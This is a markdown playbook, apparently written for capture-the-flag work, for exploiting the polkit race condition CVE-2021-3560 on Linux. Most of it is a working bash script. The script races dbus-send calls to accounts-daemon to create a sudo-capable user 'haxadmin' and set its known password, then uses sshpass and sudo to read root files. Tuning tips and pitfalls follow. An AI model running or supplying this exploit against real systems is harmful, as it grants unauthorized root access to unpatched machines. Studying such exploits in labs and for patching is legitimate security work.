# Polkit Race Condition (CVE-2021-3560)

## When this applies

- Linux target with polkit < 0.120.
- DBus available (`dbus-send` works).
- Goal: race dbus-send to create an admin user while killing the caller mid-flight. Polkit authorizes the request after the calling process is gone, bypassing credential check.

## Technique

`accounts-daemon` calls polkit after invoking process exits in race window. By killing the dbus caller mid-call, polkit grants the action without verifying the (now nonexistent) caller's permissions.

## Steps

```bash
# Phase 1: Create admin user (race until `id USERNAME` succeeds)
for i in $(seq 1 500); do
  dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply \
    /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser \
    string:haxadmin string:"Hax" int32:1 &
  sleep 0.005s; kill $! 2>/dev/null
  id haxadmin &>/dev/null && break
done
# Phase 2: Wait 2s for accounts-daemon to register dbus object, then race SetPassword
sleep 2; USERPATH="/org/freedesktop/Accounts/User$(id -u haxadmin)"
HASH=$(openssl passwd -5 password123)
for i in $(seq 1 500); do
  dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply \
    "$USERPATH" org.freedesktop.Accounts.User.SetPassword \
    string:"$HASH" string:"" &
  sleep 0.005s; kill $! 2>/dev/null
done
# Verify via SSH from external host (su needs TTY, use sshpass instead)
sshpass -p password123 ssh haxadmin@TARGET 'echo password123 | sudo -S cat /root/root.txt'
```

## Key notes

1. Both phases MUST run in same session — accounts-daemon may lose raced users between connections.
2. Sweep kill delay from 3-15ms if 5ms fails.
3. Use SSH from external host to test password — `su` requires TTY.

## Verifying success

- `id haxadmin` returns the new user with `sudo` privileges.
- `sshpass -p password123 ssh haxadmin@TARGET 'sudo cat /root/root.txt'` reads the flag.

## Common pitfalls

- Both phases must run in same session — phase 1 user may disappear if dbus connection drops.
- Kill delay tuning: try 3-15ms range if 5ms fails.
- `su` requires TTY — use sshpass + ssh from external host.

## Tools

- dbus-send
- openssl (for password hash)
- sshpass
